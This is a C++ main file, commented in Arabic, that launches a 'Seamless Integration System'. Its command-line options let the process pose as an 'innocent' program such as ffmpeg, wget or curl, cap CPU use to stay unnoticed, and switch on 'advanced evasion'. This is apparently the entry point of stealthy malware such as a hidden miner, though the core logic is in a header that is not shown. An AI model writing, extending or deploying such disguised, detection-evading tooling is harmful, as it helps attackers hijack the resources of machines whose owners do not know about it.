#include <iostream>
#include <memory>
#include <signal.h>
#include <unistd.h>
#include "seamless_integrator.h"

// متغير عام للتحكم في التطبيق
std::unique_ptr<SeamlessIntegrator> globalIntegrator;

// معالج إشارة Ctrl+C
void signalHandler(int signal) {
    std::cout << "\n[INFO] Received termination signal, shutting down gracefully..." << std::endl;
    
    if (globalIntegrator) {
        globalIntegrator->stopIntegration();
        globalIntegrator.reset();
    }
    
    exit(0);
}

void printUsage(const char* programName) {
    std::cout << "Usage: " << programName << " [options]\n";
    std::cout << "Options:\n";
    std::cout << "  --innocent <type>    Type of innocent program (ffmpeg, wget, curl, tar, rsync)\n";
    std::cout << "  --max-cpu <percent>  Maximum CPU usage before throttling (default: 70)\n";
    std::cout << "  --check-interval <seconds>  Monitoring check interval (default: 30)\n";
    std::cout << "  --advanced-evasion   Enable advanced evasion techniques\n";
    std::cout << "  --help               Show this help message\n";
    std::cout << "\nExample:\n";
    std::cout << "  " << programName << " --innocent ffmpeg --max-cpu 60 --advanced-evasion\n";
}

InnocentWrapper::ProgramType parseInnocentType(const std::string& type) {
    if (type == "ffmpeg") return InnocentWrapper::FFMPEG;
    if (type == "wget") return InnocentWrapper::WGET;
    if (type == "curl") return InnocentWrapper::CURL;
    if (type == "tar") return InnocentWrapper::TAR;
    if (type == "rsync") return InnocentWrapper::RSYNC;
    return InnocentWrapper::FFMPEG; // default
}

int main(int argc, char* argv[]) {
    std::cout << "========================================" << std::endl;
    std::cout << "🔗 Seamless Integration System v1.0" << std::endl;
    std::cout << "========================================" << std::endl;
    
    // إعداد معالج الإشارات
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    // تحليل معاملات سطر الأوامر
    SeamlessIntegrator::IntegrationConfig config;
    config.wrapperType = InnocentWrapper::FFMPEG;
    config.maxCPUUsage = 70;
    config.checkInterval = 30;
    config.enableAdvancedEvasion = false;
    config.enableResourceThrottling = true;
    
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        
        if (arg == "--help") {
            printUsage(argv[0]);
            return 0;
        } else if (arg == "--innocent" && i + 1 < argc) {
            config.wrapperType = parseInnocentType(argv[++i]);
        } else if (arg == "--max-cpu" && i + 1 < argc) {
            config.maxCPUUsage = std::stoi(argv[++i]);
        } else if (arg == "--check-interval" && i + 1 < argc) {
            config.checkInterval = std::stoi(argv[++i]);
        } else if (arg == "--advanced-evasion") {
            config.enableAdvancedEvasion = true;
        }
    }
    
    // طباعة الإعدادات
    std::cout << "[INFO] Configuration:" << std::endl;
    std::cout << "  - Innocent program: ";
    switch (config.wrapperType) {
        case InnocentWrapper::FFMPEG: std::cout << "FFmpeg"; break;
        case InnocentWrapper::WGET: std::cout << "wget"; break;
        case InnocentWrapper::CURL: std::cout << "curl"; break;
        case InnocentWrapper::TAR: std::cout << "tar"; break;
        case InnocentWrapper::RSYNC: std::cout << "rsync"; break;
        default: std::cout << "Unknown"; break;
    }
    std::cout << std::endl;
    std::cout << "  - Max CPU usage: " << config.maxCPUUsage << "%" << std::endl;
    std::cout << "  - Check interval: " << config.checkInterval << " seconds" << std::endl;
    std::cout << "  - Advanced evasion: " << (config.enableAdvancedEvasion ? "Enabled" : "Disabled") << std::endl;
    std::cout << std::endl;
    
    try {
        // إنشاء المدمج
        globalIntegrator = std::make_unique<SeamlessIntegrator>(config);
        
        // بدء التكامل
        if (!globalIntegrator->startIntegration()) {
            std::cerr << "[ERROR] Failed to start integration" << std::endl;
            return 1;
        }
        
        std::cout << "[INFO] Integration started successfully!" << std::endl;
        std::cout << "[INFO] Press Ctrl+C to stop gracefully" << std::endl;
        std::cout << "=======================================" << std::endl;
        
        // حلقة رئيسية
        while (globalIntegrator->isIntegrationActive()) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            
            // طباعة حالة دورية
            static int statusCounter = 0;
            if (++statusCounter % 12 == 0) { // كل دقيقة
                std::cout << "[STATUS] Integration active, monitoring system..." << std::endl;
            }
        }
        
        std::cout << "[WARNING] Integration stopped unexpectedly" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Exception: " << e.what() << std::endl;
        return 1;
    }
    
    // تنظيف
    if (globalIntegrator) {
        globalIntegrator->stopIntegration();
        globalIntegrator.reset();
    }
    
    std::cout << "[INFO] Program terminated" << std::endl;
    return 0;
}
